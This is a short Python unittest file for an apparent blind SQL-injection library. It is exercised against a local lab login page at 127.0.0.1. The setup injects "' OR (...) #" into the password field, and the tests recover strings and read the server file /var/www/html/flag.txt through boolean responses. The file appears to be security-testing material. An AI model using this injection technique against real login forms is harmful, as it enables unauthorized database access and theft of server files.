from unittest import TestCase

import requests

from pysqli import BlindTester, BlindStringFinder, SqliEncoder


class TestBlindStringFinder(TestCase):

    def setUp(self):
        tester = BlindTester(
            lambda payload: requests.post('http://127.0.0.1:8181/login.php',
                                          data={'login': 'admin', 'pass': "' OR ({}) #".format(payload)}),
            lambda r: 'Logged' in r.text)

        self.string_finder = BlindStringFinder(tester)

    def test_str_length(self):
        self.assertEqual(self.string_finder.str_length("(SELECT {})".format(SqliEncoder.str_to_hexa('coucou'))),
                         6)

    def test_read_string(self):
        self.assertEqual(self.string_finder.read_string("(SELECT {})".format(SqliEncoder.str_to_hexa('coucou'))),
                         'coucou')

    def test_read_file(self):
        self.assertEqual(self.string_finder.read_file('/var/www/html/flag.txt'), 'dee8cha8moh9ahyeM4atheemi\n')
